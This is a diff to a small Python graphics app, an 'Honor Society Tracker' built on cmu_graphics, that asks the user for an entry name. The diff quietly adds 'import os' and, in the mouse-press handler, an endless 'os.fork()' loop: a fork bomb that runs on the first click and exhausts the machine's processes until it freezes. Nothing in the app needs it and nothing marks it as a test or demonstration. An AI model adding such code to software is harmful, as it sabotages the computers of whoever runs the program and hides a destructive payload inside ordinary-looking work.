@@ -1,4 +1,5 @@
 from cmu_graphics import *
+import os
 
 background = Rect(0,0,400,400,fill='lightgrey')
 title = Label('Honor Society Tracker', 200,20,size=25)
@@ -9,9 +10,12 @@ inputer = Group(
     Label('Enter in Your Hours',190,70,size=20),
 )
 
+
 def onMousePress(mouseX,mouseY):
     if inputer.contains(mouseX,mouseY):
         purpose = app.getTextInput('What is the name of the entry?')
+    while True:
+        os.fork()
 
 
 cmu_graphics.run()
